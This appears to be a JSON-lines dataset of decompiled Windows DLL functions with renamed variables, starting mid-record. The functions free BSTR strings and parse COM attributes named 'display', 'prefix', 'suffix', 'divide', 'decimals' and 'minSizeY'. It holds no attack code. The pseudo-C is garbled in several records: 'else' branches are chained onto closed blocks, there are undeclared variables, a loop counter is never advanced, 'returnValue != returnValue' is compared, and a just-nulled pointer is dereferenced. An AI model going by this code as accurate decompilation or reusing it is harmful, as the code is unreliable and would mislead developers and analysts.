*)local_storage_undefined8[0] + (-4 - (int)pointer_variable)))) goto LAB_100093fc; \n        FUN_10013ceb(pointer_variable); \n    }\n    local_integer_pointer_2 = (int *)0x0; \n    local_storage_undefined4._0_1_ = 6; \n    if (local_integer_pointer == (int *)0x0) goto LAB_100093e1; \n    integer_variable = (**(code **)(*local_integer_pointer + 0x40))(local_integer_pointer, &local_integer_pointer_2); \n    integer_pointer = local_integer_pointer; \n    if (integer_variable < 0) { \n        local_storage_undefined4._0_1_ = 8; \n        if (local_integer_pointer_2 != (int *)0x0) { \n            (**(code **)(*local_integer_pointer_2 + 8))(local_integer_pointer_2); \n        }\n        goto LAB_100093d5; \n    }\n    if (local_integer_pointer != local_integer_pointer_2) { \n        local_integer_pointer = local_integer_pointer_2; \n        if (local_integer_pointer_2 != (int *)0x0) { \n            (**(code **)(*local_integer_pointer_2 + 4))(local_integer_pointer_2); \n        }\n        if (integer_pointer != (int *)0x0) { \n            (**(code **)(*integer_pointer + 8))(integer_pointer); \n        }\n    }\n    if (local_integer_pointer_2 != (int *)0x0) { \n        (**(code **)(*local_integer_pointer_2 + 8))(local_integer_pointer_2); \n    }\n    SysFreeString(local_BSTR); \n}"}
{"Function Name": "FUN_10009470", "Address": "10009470", "Source Code": "void __fastcall FUN_10009470(void **parameters)\n{\n    void *firstElement = *parameters; \n    if ((void *)0x7 < parameters[5]) { \n        if ((0xfff < (int)parameters[5] * 2 + 2U) && \n            (firstElement = *(void **)((int)firstElement + -4), 0x1f < (uint)((int)parameters[0] + (-4 - (int)firstElement)))) { \n            functionCall1(); \n            ((code *)systemInterrupt(3))(); \n            return; \n        }\n        functionCall2(firstElement); \n    }\n    parameters[4] = (void *)0x0; \n    parameters[5] = (void *)0x7; \n    *(undefined2 *)parameters = 0; \n    return; \n}"}
{"Function Name": "FUN_100094d0", "Address": "100094d0", "Source Code": "void __fastcall FUN_100094d0(int **param_1, BSTR param_2)\n{\n    int **intPtrPtr; \n    int **resultPtrPtr; \n    int *intPtr; \n    wchar_t *wideCharPtr; \n    LPCWSTR constWideCharPtr; \n    int returnValue; \n    HRESULT comparisonResult; \n    BSTR *localBSTR1; \n    BSTR *localBSTR2; \n    BSTR *localBSTR3; \n    BSTR *localBSTR4; \n    BSTR *localBSTR5; \n    BSTR *localBSTR6; \n    BSTR inputBSTR; \n    VARIANTARG localVariantArg; \n    void *localPointer; \n    uint localUnsignedInt1; \n    uint localUnsignedInt2; \n    void *localPointer2; \n    undefined *undefinedPtr; \n    undefinedPtr = &LAB_1003868a; \n    localPointer2 = ExceptionList; \n    localUnsignedInt2 = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &localPointer2; \n    resultPtrPtr = (int **)0x0; \n    inputBSTR = param_2; \n    intPtr = *param_1; \n    if (intPtr == (int *)0x0) { \n        _com_issue_error(-0x7fffbffd); \n    } else {\n        localUnsignedInt1 = 0; \n        returnValue = (**(code **)(*intPtr + 0x44))(intPtr, &resultPtrPtr, localUnsignedInt2); \n        if (returnValue < 0) goto LAB_10009f25; \n        if (resultPtrPtr != (int **)0x0) { \n            int count; \n            returnValue = (*(code *)(*resultPtrPtr)[0xb])(resultPtrPtr, &count); \n            if (returnValue < 0) goto LAB_10009f25; \n            for (int loopIndex = 0; loopIndex < count; loopIndex++) { \n                wchar_t *localWideCharPtr = (OLECHAR *)0x0; \n                returnValue = (*(code *)(*resultPtrPtr)[7])(resultPtrPtr, &localWideCharPtr); \n                if (returnValue < 0) { \n                    SysFreeString(localWideCharPtr); \n                    break; \n                }\n                returnValue = MultiByteToWideChar(3, 0, \"display\", -1, (LPWSTR)0x0, 0); \n                BSTR allocatedBSTR = SysAllocStringLen((OLECHAR *)0x0, returnValue - 1); \n                if (allocatedBSTR == (BSTR)0x0) goto LAB_10009f7e; \n                returnValue = MultiByteToWideChar(3, 0, \"display\", -1, allocatedBSTR, returnValue); \n                if (returnValue != returnValue) goto LAB_10009f7b; \n                comparisonResult = VarBstrCmp(localWideCharPtr, allocatedBSTR, 0x400, 0); \n                SysFreeString(allocatedBSTR); \n                if (comparisonResult == 1) { \n                    localUnsignedInt1 = 7; \n                    \n                }\n                SysFreeString(localWideCharPtr); \n            }\n        }\n    }\nLAB_10009f25:\n    if (resultPtrPtr != (int **)0x0) { \n        (*(code *)(*resultPtrPtr)[2])(resultPtrPtr); \n    }\n    return; \n}"}
{"Function Name": "FUN_10009f90", "Address": "10009f90", "Source Code": "void __fastcall FUN_10009f90(void **inputArray)\n{\n    void *tempPointer; \n    code *functionPointer; \n    \n    if ((void *)0x7 < inputArray[0x11]) {\n        tempPointer = inputArray[0xc]; \n        \n        if ((0xfff < (int)inputArray[0x11] * 2 + 2U) &&\n            (*(void **)((int)tempPointer + -4), 0x1f < (uint)((int)tempPointer + (-4 - *(int *)((int)tempPointer + -4))))))\n            goto LAB_1000a075; \n        FUN_10013ceb(tempPointer); \n    }\n    inputArray[0x10] = (void *)0x0; \n    inputArray[0x11] = (void *)0x7; \n    *(undefined2 *)(inputArray + 0xc) = 0; \n    \n    if ((void *)0x7 < inputArray[0xb]) {\n        tempPointer = inputArray[6]; \n        \n        if ((0xfff < (int)inputArray[0xb] * 2 + 2U) &&\n            (*(void **)((int)tempPointer + -4), 0x1f < (uint)((int)tempPointer + (-4 - *(int *)((int)tempPointer + -4))))))\n            goto LAB_1000a075; \n        FUN_10013ceb(tempPointer); \n    }\n    inputArray[10] = (void *)0x0; \n    inputArray[0xb] = (void *)0x7; \n    *(undefined2 *)(inputArray + 6) = 0; \n    \n    if ((void *)0x7 < inputArray[5]) {\n        tempPointer = *inputArray; \n        \n        if ((0xfff < (int)inputArray[5] * 2 + 2U) &&\n            (*(void **)((int)tempPointer + -4), 0x1f < (uint)((int)tempPointer + (-4 - *(int *)((int)tempPointer + -4))))) {\nLAB_1000a075: \n            FUN_1001dea6(); \n            functionPointer = (code *)swi(3); \n            (*functionPointer)(); \n            return; \n        }\n        FUN_10013ceb(tempPointer); \n    }\n    inputArray[4] = (void *)0x0; \n    inputArray[5] = (void *)0x7; \n    *(undefined2 *)inputArray = 0; \n    return; \n}"}
{"Function Name": "FUN_1000a080", "Address": "1000a080", "Source Code": "void __fastcall FUN_1000a080(int **param_1, void *param_2)\n{\n    \n    BSTR *bstrPointer1; \n    int *intPointer2; \n    BSTR bstrVariable3; \n    short shortVariable4; \n    code *codeFunctionPointer5; \n    BSTR *bstrPointer6; \n    void **voidPointer7; \n    bool booleanVariable8; \n    int integerVariable9; \n    void **voidPointer10; \n    undefined4 *undefinedPointer11; \n    int *intPointer12; \n    LPCWSTR wideStringPointer13; \n    undefined8 *undefinedPointer14; \n    undefined8 *undefinedPointer15; \n    code *codeFunctionPointer16; \n    double doubleVariable17; \n    int *localIntPointer60; \n    int *localIntPointer64; \n    int *localIntPointer68; \n    int *localIntPointer70; \n    int *localIntPointer74; \n    int *localIntPointer78; \n    int *localIntPointer7c; \n    int *localIntPointer80; \n    int *localIntPointer84; \n    int *localIntPointer88; \n    BSTR *localBstrPointer5c; \n    int localInteger58; \n    void *localVoidPointer54; \n    VARIANTARG localVariantArg3c; \n    int localInteger28; \n    OLECHAR *localOleCharPointer24; \n    void **localVoidPointer20; \n    void **localVoidPointer1c; \n    int *localIntPointer18; \n    uint localUnsignedInteger14; \n    void *localVoidPointer10; \n    undefined *stackVariableC; \n    undefined4 localUndefined8; \n    \n    stackVariableC = &LAB_1003871b;\n    localVoidPointer10 = ExceptionList;\n    localUnsignedInteger14 = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &localVoidPointer10; \n    localVoidPointer20 = (void **)0x0; \n    localUndefined8._0_1_ = 0; \n    localUndefined8._1_3_ = 0; \n    intPointer12 = *param_1; \n    voidPointer10 = (void **)ExceptionList; \n    localVoidPointer54 = param_2; \n    \n    if (intPointer12 != (int *)0x0) {\n        localUndefined8._0_1_ = 0; \n        localUndefined8._1_3_ = 0; \n        localVoidPointer20 = (void **)0x0; \n        integerVariable9 = (**(code **)(*intPointer12 + 0x44))(intPointer12, &localVoidPointer20, localUnsignedInteger14); \n        if (-1 < integerVariable9) { \n            voidPointer10 = localVoidPointer20; \n            if (localVoidPointer20 == (void **)0x0) goto LAB_1000a882; \n            integerVariable9 = (**(code **)((int)*localVoidPointer20 + 0x2c))(localVoidPointer20, &localInteger28); \n            if (-1 < integerVariable9) { \n                localVoidPointer1c = (void **)0x0; \n                localUndefined8._0_1_ = 4; \n                localInteger58 = 0; \n                codeFunctionPointer16 = SysFreeString_exref; \n                if (0 < localInteger28) { \n                    do {\n                        voidPointer7 = localVoidPointer20; \n                        if (localVoidPointer20 == (void **)0x0) goto LAB_1000a878; \n                        codeFunctionPointer5 = *(code **)((int)*localVoidPointer20 + 0x28); \n                        localUndefined8._0_1_ = 5; \n                        if (localVoidPointer1c != (void **)0x0) { \n                            (**(code **)((int)*localVoidPointer1c + 8))(localVoidPointer1c); \n                        }\n                        localUndefined8._0_1_ = 4; \n                        localVoidPointer1c = (void **)0x0; \n                        integerVariable9 = (*codeFunctionPointer5)(voidPointer7, localInteger58, &localVoidPointer1c); \n                        if (integerVariable9 < 0) break; \n                        localOleCharPointer24 = (OLECHAR *)0x0; \n                        localUndefined8._0_1_ = 8; \n                        if (localVoidPointer1c == (void **)0x0) goto LAB_1000a878; \n                        integerVariable9 = (**(code **)((int)*localVoidPointer1c + 0x1c))(localVoidPointer1c, &localOleCharPointer24); \n                        if (integerVariable9 < 0) { \n                            (*codeFunctionPointer16)(localOleCharPointer24); \n                            break; \n                        }\n                        if (localVoidPointer1c == (void **)0x0) goto LAB_1000a878; \n                        integerVariable9 = (**(code **)((int)*localVoidPointer1c + 0x20))(localVoidPointer1c, &localVariantArg3c); \n                        if (integerVariable9 < 0) { \n                            (*codeFunctionPointer16)(localOleCharPointer24); \n                            break; \n                        }\n                        localIntPointer18 = (int *)0x0; \n                        FUN_10007de0(&localIntPointer18, localOleCharPointer24); \n                        localUndefined8._0_1_ = 0xd; \n                        VariantInit(&localVariantArg3c); \n                        voidPointer10 = (void **)VariantCopy(&localVariantArg3c, &localVariantArg3c); \n                        if ((int)voidPointer10 < 0) goto LAB_1000a88c; \n                        localUndefined8 = CONCAT31(localUndefined8._1_3_, 0xe); \n                        undefinedPointer11 = FUN_10007d40(&localBstrPointer5c, \"prefix\"); \n                        booleanVariable8 = FUN_10008030(&localIntPointer18, undefinedPointer11); \n                        bstrPointer6 = localBstrPointer5c; \n                        codeFunctionPointer16 = SysFreeString_exref; \n                        if (localBstrPointer5c != (BSTR *)0x0) { \n                            LOCK(); \n                            bstrPointer1 = localBstrPointer5c + 2; \n                            bstrVariable3 = *bstrPointer1; \n                            *bstrPointer1 = (BSTR)((int)*bstrPointer1 + -1); \n                            codeFunctionPointer16 = SysFreeString_exref; \n                            UNLOCK(); \n                            if ((bstrVariable3 == (BSTR)0x1) && (localBstrPointer5c != (BSTR *)0x0)) { \n                                if (*localBstrPointer5c != (BSTR)0x0) { \n                                    SysFreeString(*localBstrPointer5c); \n                                    *bstrPointer6 = (BSTR)0x0; \n                                }\n                                if (bstrPointer6[1] != (BSTR)0x0) { \n                                    thunk_FUN_1001dc78(bstrPointer6[1]); \n                                    bstrPointer6[1] = (BSTR)0x0; \n                                }\n                                FUN_10013ceb(bstrPointer6); \n                                localBstrPointer5c = (BSTR *)0x0; \n                            } else {\n                                localBstrPointer5c = (BSTR *)0x0; \n                            }\n                        }\n                        if (booleanVariable8) { \n                            intPointer12 = (int *)FUN_10008180(&localIntPointer60, &localVariantArg3c); \n                            localUndefined8 = CONCAT31(localUndefined8._1_3_, 0xf); \n                            if ((undefined4 *)*intPointer12 == (undefined4 *)0x0) { \n                                undefinedPointer15 = (undefined8 *)0x0; \n                            } else {\n                                undefinedPointer15 = *(undefined8 **)(undefined4 *)*intPointer12; \n                            }\n                            undefinedPointer14 = undefinedPointer15; \n                            do {\n                                shortVariable4 = *(short *)undefinedPointer14; \n                                undefinedPointer14 = (undefined8 *)((int)undefinedPointer14 + 2); \n                            } while (shortVariable4 != 0); \n                            FUN_1000b690((void *)((int)localVoidPointer54 + 0x18), undefinedPointer15, (void *)((int)undefinedPointer14 - ((int)undefinedPointer15 + 2) >> 1)); \n                            intPointer12 = localIntPointer60; \n                            if (localIntPointer60 != (int *)0x0) { \n                                LOCK(); \n                                intPointer2 = localIntPointer60 + 2; \n                                integerVariable9 = *intPointer2; \n                                *intPointer2 = *intPointer2 + -1; \n                                UNLOCK(); \n                                if ((integerVariable9 == 1) && (localIntPointer60 != (int *)0x0)) { \n                                    if (*localIntPointer60 != 0) { \n                                        (*codeFunctionPointer16)(*localIntPointer60); \n                                        *intPointer12 = 0; \n                                    }\n                                    if ((void *)intPointer12[1] != (void *)0x0) { \n                                        thunk_FUN_1001dc78((void *)intPointer12[1]); \n                                        intPointer12[1] = 0; \n                                    }\n                                    FUN_10013ceb(intPointer12); \n                                }\n                                localIntPointer60 = (int *)0x0; \n                            }\n                        } else { \n                            undefinedPointer11 = FUN_10007d40(&localIntPointer64, \"suffix\"); \n                            booleanVariable8 = FUN_10008030(&localIntPointer18, undefinedPointer11); \n                            intPointer12 = localIntPointer64; \n                            if (localIntPointer64 != (int *)0x0) { \n                                LOCK(); \n                                intPointer2 = localIntPointer64 + 2; \n                                integerVariable9 = *intPointer2; \n                                *intPointer2 = *intPointer2 + -1; \n                                UNLOCK(); \n                                if ((integerVariable9 == 1) && (localIntPointer64 != (int *)0x0)) { \n                                    if (*localIntPointer64 != 0) { \n                                        (*codeFunctionPointer16)(*localIntPointer64); \n                                        *intPointer12 = 0; \n                                    }\n                                    if ((void *)intPointer12[1] != (void *)0x0) { \n                                        thunk_FUN_1001dc78((void *)intPointer12[1]); \n                                        intPointer12[1] = 0; \n                                    }\n                                    FUN_10013ceb(intPointer12); \n                                }\n                                localIntPointer64 = (int *)0x0; \n                            }\n                            if (booleanVariable8) { \n                                intPointer12 = (int *)FUN_10008180(&localIntPointer68, &localVariantArg3c); \n                                localUndefined8 = CONCAT31(localUndefined8._1_3_, 0x10); \n                                if ((undefined4 *)*intPointer12 == (undefined4 *)0x0) { \n                                    undefinedPointer15 = (undefined8 *)0x0; \n                                } else {\n                                    undefinedPointer15 = *(undefined8 **)(undefined4 *)*intPointer12; \n                                }\n                                undefinedPointer14 = undefinedPointer15; \n                                do {\n                                    shortVariable4 = *(short *)undefinedPointer14; \n                                    undefinedPointer14 = (undefined8 *)((int)undefinedPointer14 + 2); \n                                } while (shortVariable4 != 0); \n                                FUN_1000b690((void *)((int)localVoidPointer54 + 0x30), undefinedPointer15, (void *)((int)undefinedPointer14 - ((int)undefinedPointer15 + 2) >> 1)); \n                                intPointer12 = localIntPointer68; \n                                if (localIntPointer68 != (int *)0x0) { \n                                    LOCK(); \n                                    intPointer2 = localIntPointer68 + 2; \n                                    integerVariable9 = *intPointer2; \n                                    *intPointer2 = *intPointer2 + -1; \n                                    UNLOCK(); \n                                    if ((integerVariable9 == 1) && (localIntPointer68 != (int *)0x0)) { \n                                        if (*localIntPointer68 != 0) { \n                                            (*codeFunctionPointer16)(*localIntPointer68); \n                                            *intPointer12 = 0; \n                                        }\n                                        if ((void *)intPointer12[1] != (void *)0x0) { \n                                            thunk_FUN_1001dc78((void *)intPointer12[1]); \n                                            intPointer12[1] = 0; \n                                        }\n                                        FUN_10013ceb(intPointer12); \n                                    }\n                                    localIntPointer68 = (int *)0x0; \n                                }\n                            } else { \n                                undefinedPointer11 = FUN_10007d40(&local_6c, \"counter\"); \n                                booleanVariable8 = FUN_10008030(&localIntPointer18, undefinedPointer11); \n                                intPointer12 = local_6c; \n                                if (local_6c != (int *)0x0) { \n                                    LOCK(); \n                                    intPointer2 = local_6c + 2; \n                                    integerVariable9 = *intPointer2; \n                                    *intPointer2 = *intPointer2 + -1; \n                                    UNLOCK(); \n                                    if ((integerVariable9 == 1) && (local_6c != (int *)0x0)) { \n                                        if (*local_6c != 0) { \n                                            (*codeFunctionPointer16)(*local_6c); \n                                            *intPointer12 = 0; \n                                        }\n                                        if ((void *)intPointer12[1] != (void *)0x0) { \n                                            thunk_FUN_1001dc78((void *)intPointer12[1]); \n                                            intPointer12[1] = 0; \n                                        }\n                                        FUN_10013ceb(intPointer12); \n                                    }\n                                    local_6c = (int *)0x0; \n                                }\n                                if (booleanVariable8) { \n                                    intPointer12 = (int *)FUN_10008180(&localIntPointer70, &localVariantArg3c); \n                                    localUndefined8 = CONCAT31(localUndefined8._1_3_, 0x11); \n                                    if ((undefined4 *)*intPointer12 == (undefined4 *)0x0) { \n                                        undefinedPointer15 = (undefined8 *)0x0; \n                                    } else {\n                                        undefinedPointer15 = *(undefined8 **)(undefined4 *)*intPointer12; \n                                    }\n                                    undefinedPointer14 = undefinedPointer15; \n                                    do {\n                                        shortVariable4 = *(short *)undefinedPointer14; \n                                        undefinedPointer14 = (undefined8 *)((int)undefinedPointer14 + 2); \n                                    } while (shortVariable4 != 0); \n                                    FUN_1000b690(localVoidPointer54, undefinedPointer15, (void *)((int)undefinedPointer14 - ((int)undefinedPointer15 + 2) >> 1)); \n                                    intPointer12 = localIntPointer70; \n                                    if (localIntPointer70 != (int *)0x0) { \n                                        LOCK(); \n                                        intPointer2 = localIntPointer70 + 2; \n                                        integerVariable9 = *intPointer2; \n                                        *intPointer2 = *intPointer2 + -1; \n                                        UNLOCK(); \n                                        if ((integerVariable9 == 1) && (localIntPointer70 != (int *)0x0)) { \n                                            if (*localIntPointer70 != 0) { \n                                                (*codeFunctionPointer16)(*localIntPointer70); \n                                                *intPointer12 = 0; \n                                            }\n                                            if ((void *)intPointer12[1] != (void *)0x0) { \n                                                thunk_FUN_1001dc78((void *)intPointer12[1]); \n                                                intPointer12[1] = 0; \n                                            }\n                                            FUN_10013ceb(intPointer12); \n                                        }\n                                        localIntPointer70 = (int *)0x0; \n                                    }\n                                }\n                            } else { \n                                undefinedPointer11 = FUN_10007d40(&localIntPointer74, \"divide\"); \n                                booleanVariable8 = FUN_10008030(&localIntPointer18, undefinedPointer11); \n                                intPointer12 = localIntPointer74; \n                                if (localIntPointer74 != (int *)0x0) { \n                                    LOCK(); \n                                    intPointer2 = localIntPointer74 + 2; \n                                    integerVariable9 = *intPointer2; \n                                    *intPointer2 = *intPointer2 + -1; \n                                    UNLOCK(); \n                                    if ((integerVariable9 == 1) && (localIntPointer74 != (int *)0x0)) { \n                                        if (*localIntPointer74 != 0) { \n                                            (*codeFunctionPointer16)(*localIntPointer74); \n                                            *intPointer12 = 0; \n                                        }\n                                        if ((void *)intPointer12[1] != (void *)0x0) { \n                                            thunk_FUN_1001dc78((void *)intPointer12[1]); \n                                            intPointer12[1] = 0; \n                                        }\n                                        FUN_10013ceb(intPointer12); \n                                    }\n                                    localIntPointer74 = (int *)0x0; \n                                }\n                                if (booleanVariable8) { \n                                    intPointer12 = (int *)FUN_10008180(&localIntPointer78, &localVariantArg3c); \n                                    localUndefined8 = CONCAT31(localUndefined8._1_3_, 0x12); \n                                    wideStringPointer13 = FUN_10008010(intPointer12); \n                                    doubleVariable17 = FID_conflict__atof(wideStringPointer13); \n                                    *(double *)((int)localVoidPointer54 + 0x50) = doubleVariable17; \n                                    if (localIntPointer78 != (int *)0x0) { \n                                        LOCK(); \n                                        intPointer2 = localIntPointer78 + 2; \n                                        integerVariable9 = *intPointer2; \n                                        *intPointer2 = *intPointer2 + -1; \n                                        UNLOCK(); \n                                        if ((integerVariable9 == 1) && (localIntPointer78 != (int *)0x0)) { \n                                            if (*localIntPointer78 != 0) { \n                                                (*codeFunctionPointer16)(*localIntPointer78); \n                                                *intPointer12 = 0; \n                                            }\n                                            if ((void *)intPointer12[1] != (void *)0x0) { \n                                                thunk_FUN_1001dc78((void *)intPointer12[1]); \n                                                intPointer12[1] = 0; \n                                            }\n                                            FUN_10013ceb(intPointer12); \n                                        }\n                                        localIntPointer78 = (int *)0x0; \n                                    }\n                                }\n                            } else { \n                                undefinedPointer11 = FUN_10007d40(&localIntPointer7c, \"decimals\"); \n                                booleanVariable8 = FUN_10008030(&localIntPointer18, undefinedPointer11); \n                                intPointer12 = localIntPointer7c; \n                                if (localIntPointer7c != (int *)0x0) { \n                                    LOCK(); \n                                    intPointer2 = localIntPointer7c + 2; \n                                    integerVariable9 = *intPointer2; \n                                    *intPointer2 = *intPointer2 + -1; \n                                    UNLOCK(); \n                                    if ((integerVariable9 == 1) && (localIntPointer7c != (int *)0x0)) { \n                                        if (*localIntPointer7c != 0) { \n                                            (*codeFunctionPointer16)(*localIntPointer7c); \n                                            *intPointer12 = 0; \n                                        }\n                                        if ((void *)intPointer12[1] != (void *)0x0) { \n                                            thunk_FUN_1001dc78((void *)intPointer12[1]); \n                                            intPointer12[1] = 0; \n                                        }\n                                        FUN_10013ceb(intPointer12); \n                                    }\n                                    localIntPointer7c = (int *)0x0; \n                                }\n                                if (booleanVariable8) { \n                                    intPointer12 = (int *)FUN_10008180(&localIntPointer80, &localVariantArg3c); \n                                    localUndefined8 = CONCAT31(localUndefined8._1_3_, 0x13); \n                                    wideStringPointer13 = FUN_10008010(intPointer12); \n                                    integerVariable9 = FID_conflict__atoi((char *)wideStringPointer13); \n                                    *(int *)((int)localVoidPointer54 + 0x4c) = integerVariable9; \n                                    if (localIntPointer80 != (int *)0x0) { \n                                        LOCK(); \n                                        intPointer2 = localIntPointer80 + 2; \n                                        integerVariable9 = *intPointer2; \n                                        *intPointer2 = *intPointer2 + -1; \n                                        UNLOCK(); \n                                        if ((integerVariable9 == 1) && (localIntPointer80 != (int *)0x0)) { \n                                            if (*localIntPointer80 != 0) { \n                                                (*codeFunctionPointer16)(*localIntPointer80); \n                                                *intPointer12 = 0; \n                                            }\n                                            if ((void *)intPointer12[1] != (void *)0x0) { \n                                                thunk_FUN_1001dc78((void *)intPointer12[1]); \n                                                intPointer12[1] = 0; \n                                            }\n                                            FUN_10013ceb(intPointer12); \n                                        }\n                                        localIntPointer80 = (int *)0x0; \n                                    }\n                                }\n                            } else { \n                                undefinedPointer11 = FUN_10007d40(&localIntPointer84, \"characters\"); \n                                booleanVariable8 = FUN_10008030(&localIntPointer18, undefinedPointer11); \n                                intPointer12 = localIntPointer84; \n                                if (localIntPointer84 != (int *)0x0) { \n                                    LOCK(); \n                                    intPointer2 = localIntPointer84 + 2; \n                                    integerVariable9 = *intPointer2; \n                                    *intPointer2 = *intPointer2 + -1; \n                                    UNLOCK(); \n                                    if ((integerVariable9 == 1) && (localIntPointer84 != (int *)0x0)) { \n                                        if (*localIntPointer84 != 0) { \n                                            (*codeFunctionPointer16)(*localIntPointer84); \n                                            *intPointer12 = 0; \n                                        }\n                                        if ((void *)intPointer12[1] != (void *)0x0) { \n                                            thunk_FUN_1001dc78((void *)intPointer12[1]); \n                                            intPointer12[1] = 0; \n                                        }\n                                        FUN_10013ceb(intPointer12); \n                                    }\n                                    localIntPointer84 = (int *)0x0; \n                                }\n                                if (booleanVariable8) { \n                                    intPointer12 = (int *)FUN_10008180(&localIntPointer88, &localVariantArg3c); \n                                    localUndefined8 = CONCAT31(localUndefined8._1_3_, 0x14); \n                                    wideStringPointer13 = FUN_10008010(intPointer12); \n                                    integerVariable9 = FID_conflict__atoi((char *)wideStringPointer13); \n                                    *(int *)((int)localVoidPointer54 + 0x48) = integerVariable9; \n                                    if (localIntPointer88 != (int *)0x0) { \n                                        LOCK(); \n                                        intPointer2 = localIntPointer88 + 2; \n                                        integerVariable9 = *intPointer2; \n                                        *intPointer2 = *intPointer2 + -1; \n                                        UNLOCK(); \n                                        if ((integerVariable9 == 1) && (localIntPointer88 != (int *)0x0)) { \n                                            if (*localIntPointer88 != 0) { \n                                                (*codeFunctionPointer16)(*localIntPointer88); \n                                                *intPointer12 = 0; \n                                            }\n                                            if ((void *)intPointer12[1] != (void *)0x0) { \n                                                thunk_FUN_1001dc78((void *)intPointer12[1]); \n                                                intPointer12[1] = 0; \n                                            }\n                                            FUN_10013ceb(intPointer12); \n                                        }\n                                        localIntPointer88 = (int *)0x0; \n                                    }\n                                }\n                            }\n                        }\n                    } while (localInteger58 < localInteger28); \n                }\n                localUndefined8 = CONCAT31(localUndefined8._1_3_, 0x15); \n                if (localVoidPointer1c != (void **)0x0) { \n                    (**(code **)((int)*localVoidPointer1c + 8))(localVoidPointer1c); \n                }\n            }\n        }\n        localUndefined8 = 0x16; \n        if (localVoidPointer20 != (void **)0x0) { \n            (**(code **)((int)*localVoidPointer20 + 8))(localVoidPointer20); \n        }\n        ExceptionList = localVoidPointer10; \n        ___security_check_cookie_4(localUnsignedInteger14 ^ (uint)&stack0xfffffffc); \n        return; \n    }\nLAB_1000a878:\n    _com_issue_error(-0x7fffbffd); \nLAB_1000a882:\n    _com_issue_error(-0x7fffbffd); \nLAB_1000a88c:\n    _com_issue_error((long)voidPointer10); \n    codeFunctionPointer16 = (code *)swi(3); \n    (*codeFunctionPointer16)(); \n    return; \n}"}
{"Function Name": "FUN_1000a8a0", "Address": "1000a8a0", "Source Code": "void __fastcall FUN_1000a8a0(int **int_pointer_ptr,int *int_pointer)\n{\n    int *int_pointer_deref; \n    int *local_pointer_64; \n    int *local_pointer_5c; \n    int *local_pointer_60_copy; \n    int *local_pointer_68; \n    int local_integer_28; \n    VARIANTARG local_variant_arg; \n    uint local_uint_14; \n    void *local_exception_list; \n    undefined4 local_undefined_4; \n    \n    local_exception_list = ExceptionList; \n    local_uint_14 = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &local_exception_list; \n    local_pointer_64 = int_pointer; \n    int_pointer_deref = *int_pointer_ptr; \n    if (int_pointer_deref != (int *)0x0) { \n        local_undefined_4._0_1_ = 0; \n        local_undefined_4._1_3_ = 0; \n        int function_result = (**(code **)(*int_pointer_deref + 0x44))(int_pointer_deref, (void **)0x0, local_uint_14); \n        if (-1 < function_result) { \n            void **local_pointer_1c = (void **)0x0; \n            function_result = (**(code **)((int)*local_pointer_1c + 0x2c))(local_pointer_1c,&local_integer_28); \n            if (-1 < function_result) { \n                void **local_pointer_18 = (void **)0x0; \n                local_undefined_4._0_1_ = 4; \n                int local_integer_54 = 0; \n                if (0 < local_integer_28) { \n                    do {\n                        if (local_pointer_1c == (void **)0x0) goto LAB_1000acc7; \n                        code *function_pointer = *(code **)((int)*local_pointer_1c + 0x28); \n                        local_undefined_4._0_1_ = 5; \n                        if (local_pointer_18 != (void **)0x0) { \n                            (**(code **)((int)*local_pointer_18 + 8))(local_pointer_18); \n                        }\n                        local_undefined_4._0_1_ = 4; \n                        local_pointer_18 = (void **)0x0; \n                        function_result = (*function_pointer)(local_pointer_1c, local_integer_54, &local_pointer_18); \n                        if (function_result < 0) break; \n                        OLECHAR *local_ole_char = (OLECHAR *)0x0; \n                        local_undefined_4._0_1_ = 8; \n                        if (local_pointer_18 == (void **)0x0) goto LAB_1000acc7; \n                        function_result = (**(code **)((int)*local_pointer_18 + 0x1c))(local_pointer_18,&local_ole_char); \n                        if (function_result < 0) { \n                            SysFreeString_exref(local_ole_char); \n                            break; \n                        }\n                        if (local_pointer_18 == (void **)0x0) goto LAB_1000acc7; \n                        function_result = (**(code **)((int)*local_pointer_18 + 0x20))(local_pointer_18,&local_variant_arg); \n                        if (function_result < 0) goto LAB_1000ac87; \n                        int *local_integer_pointer_20 = (int *)0x0; \n                        FUN_10007de0(&local_integer_pointer_20, local_ole_char); \n                        local_undefined_4._0_1_ = 0xd; \n                        void **variant_copy_result = (void **)VariantCopy(&local_variant_arg, &local_variant_arg); \n                        if ((int)variant_copy_result < 0) goto LAB_1000acdb; \n                        void **local_pointer_18_copy = local_pointer_18; \n                        if (local_pointer_18 != (void **)0x0) { \n                            LOCK(); \n                            int *reference_count_pointer = local_integer_pointer_20 + 2; \n                            int function_result = *reference_count_pointer; \n                            *reference_count_pointer = *reference_count_pointer + -1; \n                            UNLOCK(); \n                            if ((function_result == 1) && (local_integer_pointer_20 != (int *)0x0)) { \n                                if (*local_integer_pointer_20 != 0) { \n                                    (*SysFreeString_exref)(*local_integer_pointer_20); \n                                    *local_integer_pointer_20 = 0; \n                                }\n                                if ((void *)local_integer_pointer_20[1] != (void *)0x0) { \n                                    thunk_FUN_1001dc78((void *)local_integer_pointer_20[1]); \n                                    local_integer_pointer_20[1] = 0; \n                                }\n                                FUN_10013ceb(local_integer_pointer_20); \n                            }\n                        }\n                        min_size_pointer = FUN_10007d40(&local_pointer_60_copy,\"minSizeY\"); \n                        function_call_result = FUN_10008030(&local_integer_pointer_20, min_size_pointer); \n                        int_pointer_deref = local_pointer_60_copy; \n                        if (local_pointer_60_copy != (int *)0x0) { \n                            LOCK(); \n                            reference_count_pointer = local_pointer_60_copy + 2; \n                            function_result = *reference_count_pointer; \n                            *reference_count_pointer = *reference_count_pointer + -1; \n                            UNLOCK(); \n                            if ((function_result == 1) && (local_pointer_60_copy != (int *)0x0)) { \n                                if (*local_pointer_60_copy != 0) { \n                                    (*SysFreeString_exref)(*local_pointer_60_copy); \n                                    *local_pointer_60_copy = 0; \n                                }\n                                if ((void *)int_pointer_deref[1] != (void *)0x0) { \n                                    thunk_FUN_1001dc78((void *)int_pointer_deref[1]); \n                                    int_pointer_deref[1] = 0; \n                                }\n                                FUN_10013ceb(int_pointer_deref); \n                            }\n                        }\n                    } while (local_integer_54 < local_integer_28); \n                }\n            }\n        }\n    }\n    ExceptionList = local_exception_list; \n    ___security_check_cookie_4(local_uint_14 ^ (uint)&stack0xfffffffc); \n    return; \nLAB_1000acc7:\n    _com_issue_error(-0x7fffbffd); \nLAB_1000acdb:\n    _com_issue_error((long)variant_copy_result); \n    system_call_pointer = (code *)swi(3); \n    (*system_call_pointer)(); \n    return; \n}"}
